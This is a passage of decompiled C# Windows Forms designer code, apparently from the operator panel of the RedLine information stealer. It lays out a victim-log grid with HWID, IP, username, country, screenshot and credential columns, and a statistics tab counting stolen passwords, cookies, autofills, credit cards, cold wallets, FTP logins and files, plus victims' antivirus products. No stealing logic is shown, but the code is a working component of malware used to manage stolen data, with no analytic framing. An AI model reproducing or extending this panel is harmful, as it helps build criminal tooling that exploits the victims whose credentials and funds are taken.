		((System.Windows.Forms.DataGridViewBand)this.hWIDDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn).Width = 220;
		((System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn).DataPropertyName = "IP";
		((System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn).HeaderText = "IP";
		((System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn).Name = "iPDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.iPDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn).Width = 120;
		((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn).DataPropertyName = "BuildID";
		((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn).HeaderText = "BuildID";
		((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn).Name = "buildIDDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.buildIDDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.usernameDataGridViewTextBoxColumn).DataPropertyName = "Username";
		((System.Windows.Forms.DataGridViewColumn)this.usernameDataGridViewTextBoxColumn).HeaderText = "Username";
		((System.Windows.Forms.DataGridViewColumn)this.usernameDataGridViewTextBoxColumn).Name = "usernameDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.usernameDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.usernameDataGridViewTextBoxColumn).Visible = false;
		((System.Windows.Forms.DataGridViewColumn)this.isProcessElevatedDataGridViewCheckBoxColumn).DataPropertyName = "IsProcessElevated";
		((System.Windows.Forms.DataGridViewColumn)this.isProcessElevatedDataGridViewCheckBoxColumn).HeaderText = "IsProcessElevated";
		((System.Windows.Forms.DataGridViewColumn)this.isProcessElevatedDataGridViewCheckBoxColumn).Name = "isProcessElevatedDataGridViewCheckBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.isProcessElevatedDataGridViewCheckBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.isProcessElevatedDataGridViewCheckBoxColumn).Visible = false;
		((System.Windows.Forms.DataGridViewColumn)this.currentLanguageDataGridViewTextBoxColumn).DataPropertyName = "CurrentLanguage";
		((System.Windows.Forms.DataGridViewColumn)this.currentLanguageDataGridViewTextBoxColumn).HeaderText = "CurrentLanguage";
		((System.Windows.Forms.DataGridViewColumn)this.currentLanguageDataGridViewTextBoxColumn).Name = "currentLanguageDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.currentLanguageDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.currentLanguageDataGridViewTextBoxColumn).Visible = false;
		((System.Windows.Forms.DataGridViewColumn)this.monitorSizeDataGridViewTextBoxColumn).DataPropertyName = "MonitorSize";
		((System.Windows.Forms.DataGridViewColumn)this.monitorSizeDataGridViewTextBoxColumn).HeaderText = "MonitorSize";
		((System.Windows.Forms.DataGridViewColumn)this.monitorSizeDataGridViewTextBoxColumn).Name = "monitorSizeDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.monitorSizeDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.monitorSizeDataGridViewTextBoxColumn).Visible = false;
		((System.Windows.Forms.DataGridViewColumn)this.logDateDataGridViewTextBoxColumn).DataPropertyName = "LogDate";
		((System.Windows.Forms.DataGridViewColumn)this.logDateDataGridViewTextBoxColumn).HeaderText = "LogDate";
		((System.Windows.Forms.DataGridViewColumn)this.logDateDataGridViewTextBoxColumn).Name = "logDateDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.logDateDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.uacTypeDataGridViewTextBoxColumn).DataPropertyName = "UacType";
		((System.Windows.Forms.DataGridViewColumn)this.uacTypeDataGridViewTextBoxColumn).HeaderText = "UacType";
		((System.Windows.Forms.DataGridViewColumn)this.uacTypeDataGridViewTextBoxColumn).Name = "uacTypeDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.uacTypeDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.uacTypeDataGridViewTextBoxColumn).Visible = false;
		((System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn).DataPropertyName = "Country";
		((System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn).HeaderText = "Country";
		((System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn).Name = "countryDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.countryDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn).Width = 60;
		((System.Windows.Forms.DataGridViewColumn)this.SeenBefore).DataPropertyName = "SeenBefore";
		((System.Windows.Forms.DataGridViewColumn)this.SeenBefore).HeaderText = "SeenBefore";
		((System.Windows.Forms.DataGridViewColumn)this.SeenBefore).Name = "SeenBefore";
		((System.Windows.Forms.DataGridViewBand)this.SeenBefore).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.SeenBefore).Width = 70;
		((System.Windows.Forms.DataGridViewColumn)this.Checked).DataPropertyName = "Checked";
		((System.Windows.Forms.DataGridViewColumn)this.Checked).HeaderText = "Checked";
		((System.Windows.Forms.DataGridViewColumn)this.Checked).Name = "Checked";
		((System.Windows.Forms.DataGridViewBand)this.Checked).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.Checked).Width = 55;
		((System.Windows.Forms.DataGridViewColumn)this.locationDataGridViewTextBoxColumn).DataPropertyName = "Location";
		((System.Windows.Forms.DataGridViewColumn)this.locationDataGridViewTextBoxColumn).HeaderText = "Location";
		((System.Windows.Forms.DataGridViewColumn)this.locationDataGridViewTextBoxColumn).Name = "locationDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.locationDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.locationDataGridViewTextBoxColumn).Visible = false;
		((System.Windows.Forms.DataGridViewColumn)this.timeZoneDataGridViewTextBoxColumn).DataPropertyName = "TimeZone";
		((System.Windows.Forms.DataGridViewColumn)this.timeZoneDataGridViewTextBoxColumn).HeaderText = "TimeZone";
		((System.Windows.Forms.DataGridViewColumn)this.timeZoneDataGridViewTextBoxColumn).Name = "timeZoneDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.timeZoneDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.timeZoneDataGridViewTextBoxColumn).Visible = false;
		((System.Windows.Forms.DataGridViewColumn)this.screenshotDataGridViewImageColumn).DataPropertyName = "Screenshot";
		((System.Windows.Forms.DataGridViewColumn)this.screenshotDataGridViewImageColumn).HeaderText = "Screenshot";
		((System.Windows.Forms.DataGridViewColumn)this.screenshotDataGridViewImageColumn).Name = "screenshotDataGridViewImageColumn";
		((System.Windows.Forms.DataGridViewBand)this.screenshotDataGridViewImageColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.screenshotDataGridViewImageColumn).Visible = false;
		((System.Windows.Forms.DataGridViewColumn)this.Comment).DataPropertyName = "Comment";
		((System.Windows.Forms.DataGridViewColumn)this.Comment).FillWeight = 150f;
		((System.Windows.Forms.DataGridViewColumn)this.Comment).HeaderText = "Comment";
		((System.Windows.Forms.DataGridViewColumn)this.Comment).Name = "Comment";
		((System.Windows.Forms.DataGridViewBand)this.Comment).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.Comment).Resizable = System.Windows.Forms.DataGridViewTriState.False;
		((System.Windows.Forms.DataGridViewColumn)this.Comment).Width = 150;
		((System.Windows.Forms.DataGridViewColumn)this.Creds).AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		((System.Windows.Forms.DataGridViewColumn)this.Creds).DataPropertyName = "Creds";
		((System.Windows.Forms.DataGridViewColumn)this.Creds).HeaderText = "Creds";
		((System.Windows.Forms.DataGridViewColumn)this.Creds).Name = "Creds";
		((System.Windows.Forms.DataGridViewBand)this.Creds).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.Creds).Width = 61;
		((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).DataPropertyName = "PDD";
		((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).FillWeight = 200f;
		((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).HeaderText = "PDD";
		((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).Name = "pDDDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.pDDDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).Width = 54;
		((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).DataPropertyName = "CDD";
		((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).FillWeight = 200f;
		((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).HeaderText = "CDD";
		((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).Name = "cDDDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.cDDDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).Width = 55;
		((System.Windows.Forms.DataGridViewColumn)this.Credentials).DataPropertyName = "Credentials";
		((System.Windows.Forms.DataGridViewColumn)this.Credentials).HeaderText = "Credentials";
		((System.Windows.Forms.DataGridViewColumn)this.Credentials).Name = "Credentials";
		((System.Windows.Forms.DataGridViewBand)this.Credentials).ReadOnly = true;
		((System.Windows.Forms.DataGridViewBand)this.Credentials).Visible = false;
		((System.Windows.Forms.BindingSource)this.object_17).DataSource = typeof(RedLine.SharedModels.UserLog);
		((System.Windows.Forms.Control)this.statisticTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider20);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.activeConnections);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider6);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider7);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider17);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider8);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider18);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.top10AvsLb);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetLabel6);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.ce);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.c4);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.c5);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.top10CountriesLb);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.top10countryLbl);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.top10osLb);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.top10osLbl);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.ftpLbl);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.ftpsCounter);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.filesLbl);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.filesCounter);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider5);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.cardsLbl);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.creditcardsCounter);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider4);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.autofillsLbl);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.autofillsCounter);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider3);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.cookiesLbl);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.cookiesCounter);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider2);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.passwordsLbl);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.passwordsCounter);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider1);
		((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.label56);
		((System.Windows.Forms.Control)this.statisticTab).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.statisticTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.statisticTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.statisticTab).Name = "statisticTab";
		((System.Windows.Forms.Control)this.statisticTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.statisticTab).TabIndex = 3;
		((System.Windows.Forms.Control)this.statisticTab).Text = "Statistic";
		((System.Windows.Forms.Control)this.metroSetDivider20).Location = new System.Drawing.Point(-1, 61);
		((System.Windows.Forms.Control)this.metroSetDivider20).Name = "metroSetDivider20";
		((MetroSetDivider)this.metroSetDivider20).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider20).Size = new System.Drawing.Size(216, 4);
		((MetroSetDivider)this.metroSetDivider20).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider20).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider20).TabIndex = 41;
		((System.Windows.Forms.Control)this.metroSetDivider20).Text = "metroSetDivider20";
		((MetroSetDivider)this.metroSetDivider20).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider20).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider20).Thickness = 1;
		((System.Windows.Forms.Control)this.activeConnections).AutoSize = true;
		((System.Windows.Forms.Control)this.activeConnections).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.activeConnections).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.activeConnections).Location = new System.Drawing.Point(149, 38);
		((System.Windows.Forms.Control)this.activeConnections).Name = "activeConnections";
		((System.Windows.Forms.Control)this.activeConnections).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.activeConnections).TabIndex = 39;
		((System.Windows.Forms.Control)this.activeConnections).Text = "0";
		((System.Windows.Forms.Label)this.activeConnections).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.metroSetDivider6).Location = new System.Drawing.Point(-1, 481);
		((System.Windows.Forms.Control)this.metroSetDivider6).Name = "metroSetDivider6";
		((MetroSetDivider)this.metroSetDivider6).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider6).Size = new System.Drawing.Size(1169, 4);
		((MetroSetDivider)this.metroSetDivider6).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider6).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider6).TabIndex = 20;
		((System.Windows.Forms.Control)this.metroSetDivider6).Text = "metroSetDivider6";
		((MetroSetDivider)this.metroSetDivider6).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider6).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider6).Thickness = 1;
		((System.Windows.Forms.Control)this.metroSetDivider7).Location = new System.Drawing.Point(214, 5);
		((System.Windows.Forms.Control)this.metroSetDivider7).Name = "metroSetDivider7";
		((MetroSetDivider)this.metroSetDivider7).Orientation = (DividerStyle)1;
		((System.Windows.Forms.Control)this.metroSetDivider7).Size = new System.Drawing.Size(4, 480);
		((MetroSetDivider)this.metroSetDivider7).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider7).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider7).TabIndex = 23;
		((System.Windows.Forms.Control)this.metroSetDivider7).Text = "metroSetDivider7";
		((MetroSetDivider)this.metroSetDivider7).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider7).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider7).Thickness = 1;
		((System.Windows.Forms.Control)this.metroSetDivider17).Location = new System.Drawing.Point(910, 5);
		((System.Windows.Forms.Control)this.metroSetDivider17).Name = "metroSetDivider17";
		((MetroSetDivider)this.metroSetDivider17).Orientation = (DividerStyle)1;
		((System.Windows.Forms.Control)this.metroSetDivider17).Size = new System.Drawing.Size(4, 480);
		((MetroSetDivider)this.metroSetDivider17).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider17).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider17).TabIndex = 37;
		((System.Windows.Forms.Control)this.metroSetDivider17).Text = "metroSetDivider17";
		((MetroSetDivider)this.metroSetDivider17).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider17).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider17).Thickness = 1;
		((System.Windows.Forms.Control)this.metroSetDivider8).Location = new System.Drawing.Point(564, 5);
		((System.Windows.Forms.Control)this.metroSetDivider8).Name = "metroSetDivider8";
		((MetroSetDivider)this.metroSetDivider8).Orientation = (DividerStyle)1;
		((System.Windows.Forms.Control)this.metroSetDivider8).Size = new System.Drawing.Size(4, 480);
		((MetroSetDivider)this.metroSetDivider8).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider8).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider8).TabIndex = 26;
		((System.Windows.Forms.Control)this.metroSetDivider8).Text = "metroSetDivider8";
		((MetroSetDivider)this.metroSetDivider8).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider8).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider8).Thickness = 1;
		((System.Windows.Forms.Control)this.metroSetDivider18).Location = new System.Drawing.Point(-1, 120);
		((System.Windows.Forms.Control)this.metroSetDivider18).Name = "metroSetDivider18";
		((MetroSetDivider)this.metroSetDivider18).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider18).Size = new System.Drawing.Size(216, 4);
		((MetroSetDivider)this.metroSetDivider18).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider18).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider18).TabIndex = 38;
		((System.Windows.Forms.Control)this.metroSetDivider18).Text = "metroSetDivider18";
		((MetroSetDivider)this.metroSetDivider18).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider18).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider18).Thickness = 1;
		((System.Windows.Forms.Control)this.top10AvsLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.top10AvsLb).BorderStyle = System.Windows.Forms.BorderStyle.None;
		((System.Windows.Forms.Control)this.top10AvsLb).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.top10AvsLb).Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.top10AvsLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.top10AvsLb).ItemHeight = 14;
		((System.Windows.Forms.ListBox)this.top10AvsLb).Items.AddRange(new object[10] { "1", "2", "3", "4", "5", "6", "7", "8", "9", "10" });
		((System.Windows.Forms.Control)this.top10AvsLb).Location = new System.Drawing.Point(574, 74);
		((System.Windows.Forms.Control)this.top10AvsLb).Name = "top10AvsLb";
		((System.Windows.Forms.ListBox)this.top10AvsLb).SelectionMode = System.Windows.Forms.SelectionMode.None;
		((System.Windows.Forms.Control)this.top10AvsLb).Size = new System.Drawing.Size(330, 224);
		((System.Windows.Forms.Control)this.top10AvsLb).TabIndex = 36;
		((System.Windows.Forms.Control)this.metroSetLabel6).Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.metroSetLabel6).Location = new System.Drawing.Point(574, 43);
		((System.Windows.Forms.Control)this.metroSetLabel6).Name = "metroSetLabel6";
		((System.Windows.Forms.Control)this.metroSetLabel6).Size = new System.Drawing.Size(330, 23);
		((MetroSetLabel)this.metroSetLabel6).Style = (Style)1;
		((MetroSetLabel)this.metroSetLabel6).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetLabel6).TabIndex = 35;
		((System.Windows.Forms.Control)this.metroSetLabel6).Text = "Top 10 of AV";
		((System.Windows.Forms.Label)this.metroSetLabel6).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.metroSetLabel6).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.metroSetLabel6).ThemeName = "MetroDark";
		((MetroSetButton)this.ce).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.ce).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.ce).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.ce).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.ce).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.ce).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.ce).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.ce).Location = new System.Drawing.Point(1045, 608);
		((System.Windows.Forms.Control)this.ce).Name = "resetStatsBtn";
		((MetroSetButton)this.ce).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.ce).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.ce).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.ce).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.ce).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.ce).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.ce).Size = new System.Drawing.Size(115, 23);
		((MetroSetButton)this.ce).Style = (Style)0;
		((MetroSetButton)this.ce).StyleManager = null;
		((System.Windows.Forms.Control)this.ce).TabIndex = 34;
		((System.Windows.Forms.Control)this.ce).Text = "Reset all stats";
		((MetroSetButton)this.ce).ThemeAuthor = "Narwin";
		((MetroSetButton)this.ce).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.ce).Click += new System.EventHandler(ce_Click);
		((System.Windows.Forms.Control)this.c4).AutoSize = true;
		((System.Windows.Forms.Control)this.c4).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.c4).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.c4).Location = new System.Drawing.Point(4, 98);
		((System.Windows.Forms.Control)this.c4).Name = "coldWalletLbl";
		((System.Windows.Forms.Control)this.c4).Size = new System.Drawing.Size(100, 21);
		((System.Windows.Forms.Control)this.c4).TabIndex = 31;
		((System.Windows.Forms.Control)this.c4).Text = "Cold Wallets:";
		((System.Windows.Forms.Label)this.c4).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.c5).AutoSize = true;
		((System.Windows.Forms.Control)this.c5).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.c5).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.c5).Location = new System.Drawing.Point(103, 97);
		((System.Windows.Forms.Control)this.c5).Name = "coldWalletCounter";
		((System.Windows.Forms.Control)this.c5).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.c5).TabIndex = 30;
		((System.Windows.Forms.Control)this.c5).Text = "0";
		((System.Windows.Forms.Label)this.c5).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.top10CountriesLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.top10CountriesLb).BorderStyle = System.Windows.Forms.BorderStyle.None;
		((System.Windows.Forms.Control)this.top10CountriesLb).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.top10CountriesLb).Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.top10CountriesLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.top10CountriesLb).ItemHeight = 14;
		((System.Windows.Forms.ListBox)this.top10CountriesLb).Items.AddRange(new object[10] { "1", "2", "3", "4", "5", "6", "7", "8", "9", "10" });
		((System.Windows.Forms.Control)this.top10CountriesLb).Location = new System.Drawing.Point(917, 74);
		((System.Windows.Forms.Control)this.top10CountriesLb).Name = "top10CountriesLb";
		((System.Windows.Forms.ListBox)this.top10CountriesLb).SelectionMode = System.Windows.Forms.SelectionMode.None;
		((System.Windows.Forms.Control)this.top10CountriesLb).Size = new System.Drawing.Size(248, 224);
		((System.Windows.Forms.Control)this.top10CountriesLb).TabIndex = 28;
		((System.Windows.Forms.Control)this.top10countryLbl).Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.top10countryLbl).Location = new System.Drawing.Point(917, 43);
		((System.Windows.Forms.Control)this.top10countryLbl).Name = "top10countryLbl";
		((System.Windows.Forms.Control)this.top10countryLbl).Size = new System.Drawing.Size(248, 23);
		((MetroSetLabel)this.top10countryLbl).Style = (Style)1;
		((MetroSetLabel)this.top10countryLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.top10countryLbl).TabIndex = 27;
		((System.Windows.Forms.Control)this.top10countryLbl).Text = "Top 10 of Country";
		((System.Windows.Forms.Label)this.top10countryLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.top10countryLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.top10countryLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.top10osLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ListBox)this.top10osLb).BorderStyle = System.Windows.Forms.BorderStyle.None;
		((System.Windows.Forms.Control)this.top10osLb).Cursor = System.Windows.Forms.Cursors.Default;
		((System.Windows.Forms.Control)this.top10osLb).Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.top10osLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListBox)this.top10osLb).HorizontalScrollbar = true;
		((System.Windows.Forms.ListBox)this.top10osLb).ItemHeight = 14;
		((System.Windows.Forms.ListBox)this.top10osLb).Items.AddRange(new object[10] { "1", "2", "3", "4", "5", "6", "7", "8", "9", "10" });
		((System.Windows.Forms.Control)this.top10osLb).Location = new System.Drawing.Point(226, 74);
		((System.Windows.Forms.Control)this.top10osLb).Name = "top10osLb";
		((System.Windows.Forms.ListBox)this.top10osLb).SelectionMode = System.Windows.Forms.SelectionMode.None;
